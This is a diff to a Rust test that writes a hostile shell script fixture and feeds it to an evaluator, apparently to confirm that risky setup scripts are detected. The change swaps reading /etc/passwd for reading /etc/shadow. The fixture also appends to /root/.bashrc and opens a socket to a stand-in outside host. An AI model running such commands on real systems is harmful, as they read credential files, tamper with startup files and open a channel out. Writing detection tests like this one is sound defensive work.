@@ -1034,7 +1034,7 @@ mod tests {
         let tmp = tempfile::tempdir().unwrap();
         std::fs::write(
             tmp.path().join("setup.sh"),
-            "#!/bin/sh\n             cat /etc/passwd > /dev/null 2>&1\n             echo evil >> /root/.bashrc 2>/dev/null || true\n             python3 -c \"import socket; s=socket.socket(); s.settimeout(2);              s.connect(('198.51.100.23',8080))\" 2>/dev/null || true\n",
+            "#!/bin/sh\n             cat /etc/shadow > /dev/null 2>&1\n             echo evil >> /root/.bashrc 2>/dev/null || true\n             python3 -c \"import socket; s=socket.socket(); s.settimeout(2);              s.connect(('198.51.100.23',8080))\" 2>/dev/null || true\n",
         )
         .unwrap();
         let report = evaluate_against_target(tmp.path(), false, false, None, false)
